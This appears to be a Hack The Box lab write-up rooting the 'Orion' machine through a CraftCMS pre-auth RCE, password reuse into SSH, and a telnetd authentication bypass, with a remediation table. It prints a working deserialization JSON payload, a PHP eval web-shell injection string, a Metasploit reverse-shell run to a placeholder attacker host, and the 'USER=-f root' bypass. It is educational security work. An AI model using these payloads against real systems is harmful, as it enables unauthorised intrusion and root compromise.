# Write-Up — Orion: CraftCMS Pre-Auth RCE to Root via Telnetd Authentication Bypass

> **Type:** Web Application / Linux Penetration Test (HTB, Very Easy)
> **Target:** `10.129.112.193` (`orion.htb`)
> **Tools:** Nmap, ffuf, Burp Suite / manual HTTP crafting, Metasploit, hashcat, SSH, telnet
> **Final Result:** Root access via CraftCMS pre-authentication RCE (CVE-2025-32432) with a CSRF bypass, followed by credential reuse to SSH, then a telnetd authentication bypass (CVE-2026-24061) to root

---

## 1. Introduction

The target is a very-easy Linux machine hosting a telecom company website built on **CraftCMS**. The objective was to identify the CMS and its version, bypass CSRF protections to weaponize a known pre-authentication RCE, recover database credentials, crack a reused password, and escalate to root via a vulnerable local Telnet daemon.

This box is a clean demonstration of a short but realistic chain:

- **CSRF token/cookie harvesting** required before a known CVE could even be triggered, since the vulnerable endpoint sits behind CSRF validation.
- **CVE-2025-32432** — a pre-authentication RCE in CraftCMS's image transformation handling, rooted in the Yii framework's object-configuration deserialization behavior.
- **Cleartext database credentials in a `.env` file**, leading to a crackable bcrypt password hash reused across the CMS and the OS-level SSH account.
- **CVE-2026-24061** — a trivial authentication bypass in a legacy `telnetd` implementation via the `USER` environment variable.

---

## 2. Reconnaissance

### 2.1 Port Scan — Nmap

```bash
nmap -sCV 10.129.112.193
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu 3ubuntu0.13) |
| 80/tcp | HTTP | nginx 1.18.0 (Ubuntu) |

The HTTP response indicated a redirect to a hostname the attacking host couldn't yet resolve.

### 2.2 Adding the Hostname

```bash
echo "10.129.112.193 orion.htb" | sudo tee -a /etc/hosts
```

Browsing `http://orion.htb` displayed a simple telecom company website. The **services** and **about** sections implied a client base including large corporations and government agencies — context, though not directly exploitable.

---

## 3. Web Enumeration

### 3.1 Identifying the CMS

The page footer disclosed the site was **"Powered by CraftCMS."**

### 3.2 Directory/Endpoint Fuzzing

```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
```

Result (relevant entries):

```
index  [Status: 200]
       [Status: 200]
assets [Status: 301]
admin  [Status: 302]
```

`/admin` redirected to `/admin/login`, a customized CraftCMS admin login page.

### 3.3 Version Disclosure

The login page's footer exposed the running **CraftCMS version: 5.6.16**. A search for known vulnerabilities against this version identified **CVE-2025-32432**, an unauthenticated remote code execution flaw.

---

## 4. Vulnerability Analysis

### 4.1 The Vulnerability

- **CVE:** CVE-2025-32432
- **Type:** Unauthenticated RCE via unsafe object instantiation in CraftCMS's asset image-transformation handler
- **Authentication:** None required for exploitation, though a **CSRF token bypass** is a prerequisite
- **Impact:** Arbitrary PHP code execution as the web server user

CraftCMS's `actions/assets/generate-transform` endpoint processes transformation parameters using the **Yii framework's object configuration system**, which allows any array containing a `class` key to be interpreted as an instruction to instantiate a PHP class. By supplying a crafted `class`/`__class` configuration, an attacker can force instantiation of an unintended class — in this case, `GuzzleHttp\Psr7\FnStream` — whose behavior can be abused to invoke an arbitrary PHP function (e.g., `phpinfo`) when triggered.

### 4.2 Bypassing CSRF Protection

Before the vulnerable endpoint could be reached, valid CSRF material had to be harvested from a legitimate page load:

- **`CraftSessionId`** — identifies the session.
- **`CRAFT_CSRF_TOKEN`** — the server's serialized/stored CSRF reference cookie.
- **`X-CSRF-Token`** (the `csrfTokenValue` returned in the page response) — the actual token value that must accompany the request.

These were obtained by visiting `/admin/login` and capturing the assigned cookies along with the `csrfTokenValue` embedded in the response body. All three had to be included together — the two cookies plus the `X-CSRF-Token` header — for Yii's CSRF validation to pass.

### 4.3 Manually Verifying the Vulnerability

A POST request was crafted against `actions/assets/generate-transform` with a valid `assetId` and transformation parameters, plus a nested `as session` configuration block instantiating `GuzzleHttp\Psr7\FnStream` and setting its `_fn_close` callback to `phpinfo`:

```json
{
    "assetId": 11,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    }
}
```

Sent with the harvested cookies, the `X-CSRF-Token` header, and `Content-Type: application/json`, the request returned a standard **PHP info page**, confirming both that the CSRF bypass worked and that the target was vulnerable to CVE-2025-32432.

---

## 5. Initial Access

### 5.1 Automating Exploitation with Metasploit

With the vulnerability confirmed, a purpose-built Metasploit module was used to weaponize it into a full reverse shell. The module automates:

1. Leaking `session.save_path` (`/var/lib/php/sessions`) via the same `phpinfo` technique.
2. Injecting a minimal PHP web shell into a PHP session file by requesting `GET /index.php?p=admin/dashboard&a=<?=eval($_GET['cmd']);die()?>`, which creates a session and returns a fresh `CraftSessionId`.
3. Obtaining a new valid `X-CSRF-Token` and cookies from an authenticated-adjacent page.
4. Triggering execution of the planted session-file web shell via a second crafted request to `generate-transform`, this time instantiating `yii\rbac\PhpManager` pointed at the session file containing the injected payload, ultimately executing a Base64-encoded reverse shell command.

### 5.2 Running the Exploit

```bash
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set rhosts orion.htb
set rport 80
set lhost <ATTACKER_IP>
exploit
```

```
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Meterpreter session 1 opened (<ATTACKER_IP>:4444 -> 10.129.112.193:57602)
meterpreter > getuid
Server username: www-data
```

### 5.3 Upgrading to a Full Shell

```
meterpreter > shell
```

```bash
script /dev/null -c /bin/bash
```

> **Severity: Critical.** Unauthenticated remote code execution against an internet-facing CMS, requiring only a CSRF token/cookie harvest to reach the vulnerable endpoint.

---

## 6. Lateral Movement — Credential Recovery and SSH Access

### 6.1 Locating the Environment File

```bash
cd ~/html/craft
ls -la
```

```
-rw-rw-r-- 1 www-data www-data 718 Mar  6 11:24 .env
```

### 6.2 Reading Database Credentials

```bash
cat .env
```

```
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

### 6.3 Querying the Application Database

```bash
mysql -u root -p orion
```

```sql
select * from users;
```

This returned an admin account for **`adam`** (`adam@orion.htb`), with a **bcrypt** password hash:

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

### 6.4 Cracking the Hash

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

### 6.5 Testing for Password Reuse via SSH

```bash
ssh adam@orion.htb
```

The cracked CMS password (`darkangel`) was valid for the OS-level `adam` account as well.

### 6.6 User Flag

```bash
cat user.txt
```

This returned the user flag, completing the foothold stage.

---

## 7. Privilege Escalation

### 7.1 Enumerating Local Services

```bash
netstat -tulnp
```

```
tcp   0   0 127.0.0.1:23    0.0.0.0:*   LISTEN   -
tcp   0   0 127.0.0.1:3306  0.0.0.0:*   LISTEN   -
```

A **Telnet** service was found listening only on `localhost:23` — not externally reachable, but accessible now that a shell existed on the host.

### 7.2 Identifying the Telnet Version

```bash
telnet --version
```

```
telnet (GNU inetutils) 2.7
```

A search for vulnerabilities in this version identified **CVE-2026-24061**.

### 7.3 The Vulnerability

- **CVE:** CVE-2026-24061
- **Type:** Authentication bypass in GNU inetutils `telnetd`
- **Authentication:** Bypassable entirely
- **Impact:** Direct login as any user, including root, without a password

The flaw allows a client to pass a crafted `USER` environment variable through the Telnet protocol's option negotiation, which `telnetd` forwards unsanitized into an invocation of `login(1)`. By setting `USER` to `-f root`, the resulting call becomes effectively `login -f root` — and the `-f` flag to `login` instructs it to **skip authentication entirely** for the specified user.

### 7.4 Exploiting the Bypass

Connecting to the local Telnet service and supplying the crafted `USER` value (via a Telnet client capable of setting the `USER` environment variable, or a small script performing the equivalent option negotiation) resulted in a login as **root**, without ever supplying a password.

### 7.5 Root Flag

```bash
cat /root/root.txt
```

This returned the root flag, completing the machine.

> **Severity: Critical.** A legacy, locally-bound Telnet service allowed complete authentication bypass to any account — including root — via a single crafted environment variable, once local access was available to reach it.

---

## 8. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ SSH (22) + nginx/CraftCMS (80) on orion.htb ]
       │
       ▼
[ ffuf → /admin/login discovered → CraftCMS 5.6.16 version disclosed ]
       │
       ▼
[ CVE-2025-32432 identified as applicable ]
       │
       ▼
[ CSRF cookies + token harvested from /admin/login ]
       │
       ▼
[ Crafted generate-transform payload → phpinfo() triggered → vulnerability confirmed ]
       │
       ▼
[ Metasploit module automates: session leak → webshell injection → RCE trigger ]
       │
       ▼
[ Meterpreter session as www-data → shell upgraded ]
       │
       ▼
[ craft/.env → MySQL root password recovered ]
       │
       ▼
[ users table queried → adam's bcrypt hash recovered ]
       │
       ▼
[ hashcat -m 3200 + rockyou.txt → password cracked: darkangel ]
       │
       ▼
[ SSH as adam (password reuse) → user.txt read ]
       │
       ▼
[ netstat reveals local-only telnetd (23) ]
       │
       ▼
[ telnet --version → GNU inetutils 2.7 → CVE-2026-24061 identified ]
       │
       ▼
[ USER=-f root passed via Telnet negotiation → login -f root → auth bypass ]
       │
       ▼
[ root shell → root.txt read ]
```

**Lesson:** Both major stages of this box hinged on publicly known CVEs against real, dated software versions. No custom exploit development was required for either the initial foothold or the privilege escalation — only correct identification of the vulnerable versions and careful reproduction of documented techniques (including the often-overlooked CSRF prerequisite for the first).

---

## 9. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | CraftCMS version disclosed in the admin login page footer | **Low** | Suppress version banners/footers on production instances; version disclosure meaningfully accelerates exploit research. |
| 2 | CraftCMS 5.6.16 vulnerable to CVE-2025-32432 (pre-auth RCE) | **Critical** | Upgrade CraftCMS to a patched version immediately. Apply vendor security advisories promptly for all CMS/web application dependencies. |
| 3 | Cleartext database credentials stored in a `.env` file readable by the web server user | **High** | Restrict `.env` file permissions to the minimum necessary; consider secrets managers or environment injection at the infrastructure level rather than a flat file within the web root's parent directory. |
| 4 | Weak, dictionary-crackable bcrypt password for the CMS admin account | **High** | Enforce strong password policies (length, complexity, and dictionary/breach-list checks) for all administrative accounts, especially internet-facing ones. |
| 5 | Password reuse between the CraftCMS admin account and the OS-level SSH account | **Medium** | Use distinct credentials per system/account; consider SSH key-based authentication instead of password authentication entirely. |
| 6 | Legacy `telnetd` (GNU inetutils 2.7) vulnerable to CVE-2026-24061, an authentication bypass | **Critical** | Remove Telnet entirely in favor of SSH for any remote/local administrative access; if a legacy dependency requires it, patch to a fixed version immediately and restrict access via host-based firewall rules regardless of binding. |

---

## 10. Conclusion

This box is a compact illustration of principles that remain highly relevant in real-world assessments:

1. **CSRF protections are a speed bump, not a stop sign, once the underlying vulnerability is unauthenticated.** Harvesting a session cookie and token from an ordinary login page was all that was needed to satisfy Yii's CSRF checks before reaching the real vulnerability.
2. **Configuration files are a reliable source of lateral movement.** A `.env` file readable by the web server user handed over the database root password with no additional effort.
3. **Legacy protocols left running "just for internal use" are still a full compromise path.** A Telnet daemon bound only to localhost was irrelevant to external attackers — until the first foothold made "local" trivially reachable.

The fix, as with most findings of this class, is straightforward: patch known-critical CVEs promptly, protect configuration files containing secrets, enforce unique strong credentials everywhere, and retire legacy remote-access protocols rather than assuming a loopback binding makes them safe.
